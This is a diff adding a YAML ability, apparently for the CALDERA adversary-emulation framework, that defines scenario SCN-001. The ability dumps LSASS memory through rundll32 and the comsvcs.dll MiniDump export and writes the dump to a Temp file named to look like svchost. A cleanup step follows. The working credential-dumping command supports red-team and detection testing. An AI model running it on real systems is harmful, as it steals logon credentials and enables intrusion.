@@ -1,0 +1,34 @@
+---
+- id: scn001-a2-lsass-dump-comsvcs
+  name: "SCN-001 | Dump LSASS via comsvcs.dll (MiniDump)"
+  description: |
+    Dumps LSASS process memory to disk using the built-in comsvcs.dll MiniDump export.
+    This is a living-off-the-land technique — no external tooling required.
+    Commonly used by threat actors to avoid AV detection of Mimikatz binary on disk.
+    Maps to T1003.001.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: "OS Credential Dumping: LSASS Memory"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $lsass = Get-Process lsass;
+          $dumpPath = "C:\Windows\Temp\svchost.dmp";
+          rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id $dumpPath full;
+          Start-Sleep -Seconds 3;
+          if (Test-Path $dumpPath) {
+            $size = (Get-Item $dumpPath).Length;
+            Write-Output "LSASS dump successful: $dumpPath ($size bytes)"
+          } else {
+            Write-Output "LSASS dump failed — check privileges"
+          }
+        cleanup: |
+          Remove-Item -Path "C:\Windows\Temp\svchost.dmp" -Force -ErrorAction SilentlyContinue;
+          Write-Output "Cleanup complete"
+        parsers:
+          org.mitre.caldera.parsers.basic:
+            - source: host.file.path
+              edge: has_lsass_dump
+              target: C:\Windows\Temp\svchost.dmp
